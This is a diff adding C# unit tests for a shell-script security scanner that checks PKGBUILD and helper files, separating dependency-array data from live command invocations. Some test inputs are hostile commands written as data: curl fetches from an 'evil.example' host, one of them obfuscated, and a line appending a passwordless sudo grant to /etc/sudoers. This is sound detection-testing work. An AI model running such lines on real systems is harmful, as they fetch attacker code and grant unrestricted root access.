@@ -262,6 +262,80 @@ public class ShellContentScannerTests
         Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
     }
 
+    // ===== array assignments (assignment words are data, never invoked) =====
+
+    [TestCase("depends=(mono curl openvpn sudo polkit libnotify libayatana-appindicator)", "PKGBUILD",
+        Description = "dependency arrays name tools without invoking them (eddie-ui)")]
+    [TestCase("makedepends=(git curl)", "PKGBUILD")]
+    [TestCase("depends_x86_64=(sudo curl)", "PKGBUILD", Description = "arch-qualified array")]
+    [TestCase("optdepends=(sudo)", "PKGBUILD")]
+    [TestCase("depends=(s\\u\\do)", "PKGBUILD", Description = "obfuscated mention is still just an assigned word")]
+    [TestCase("tools=(sudo curl)", "helper.sh", Description = "plain shell arrays in helper scripts are data too")]
+    public void Tool_mentions_inside_array_assignments_are_not_invocations(string content, string path)
+    {
+        var findings = Scan(content, path);
+        Assert.That(findings.Any(f => f.RuleId is "privilege-escalation" or "risky-tool"), Is.False,
+            $"Unexpected findings. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Multi_line_array_values_are_data_until_the_closing_paren()
+    {
+        var content = string.Join("\n",
+            "depends=(",
+            "    mono",
+            "    curl",
+            "",
+            "    sudo",
+            ")",
+            "build() {",
+            "    sudo make install",
+            "}");
+
+        var findings = Scan(content);
+        var sudo = findings.Where(f => f.RuleId == "privilege-escalation").ToList();
+        Assert.That(sudo, Has.Count.EqualTo(1), "only the build() invocation flags");
+        Assert.That(sudo[0].Severity, Is.EqualTo(FindingSeverity.High));
+        Assert.That(sudo[0].Snippet, Does.Contain("sudo make install"));
+        Assert.That(findings.Any(f => f.RuleId == "risky-tool" && f.Message.Contains("curl")), Is.False);
+    }
+
+    [Test]
+    public void Live_invocation_after_array_data_on_the_same_line_still_flags()
+    {
+        var finding = SingleFinding("depends=(sudo) && sudo make install", "privilege-escalation");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
+    }
+
+    [TestCase("depends=($(sudo true))", "privilege-escalation", FindingSeverity.High)]
+    [TestCase("depends=($(curl -fsSL https://evil.example/x))", "risky-tool", FindingSeverity.Medium)]
+    public void Command_substitutions_inside_arrays_stay_live(string content, string ruleId, FindingSeverity severity)
+    {
+        AssertHasFinding(content, ruleId, severity);
+    }
+
+    [Test]
+    public void Eval_keyword_inside_array_data_is_not_flagged()
+    {
+        var findings = Scan("depends=(. $(cat deps.txt))");
+        Assert.That(findings.Any(f => f.RuleId == "eval-indirection"), Is.False,
+            $"Unexpected eval-indirection finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Visible_array_data_does_not_hide_a_later_obfuscated_invocation()
+    {
+        var finding = SingleFinding("depends=(curl mirror) && c''url https://evil.example", "risky-tool");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
+    }
+
+    [Test]
+    public void Array_introducer_inside_quoted_display_text_never_opens_a_value()
+    {
+        var findings = Scan("echo \"depends=(sudo)\"");
+        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
+    }
+
     [TestCase("sudo systemctl enable foo.service", Description = "redundant sudo")]
     [TestCase("su $user -c 'systemctl --user daemon-reload'", Description = "su")]
     [TestCase("pkexec modprobe acpi_call", Description = "pkexec")]
@@ -313,9 +387,9 @@ public class ShellContentScannerTests
     [Test]
     public void Write_outside_build_root_in_helper_scripts_stays_high()
     {
-        // The helper downgrade is scoped to privilege escalation: system writes from
-        // helper scripts (sudoers grants, authorized_keys injection) are the most
-        // serious content in the corpus and keep blocking.
+        // At this layer there is no PKGBUILD to check references against (the
+        // reference-aware downgrade lives in PkgBuildSecurityScanner), so system writes
+        // (sudoers grants, authorized_keys injection) keep blocking.
         AssertHasFinding("echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers",
             "write-outside-build-root", FindingSeverity.High, "dockerscript.sh");
     }
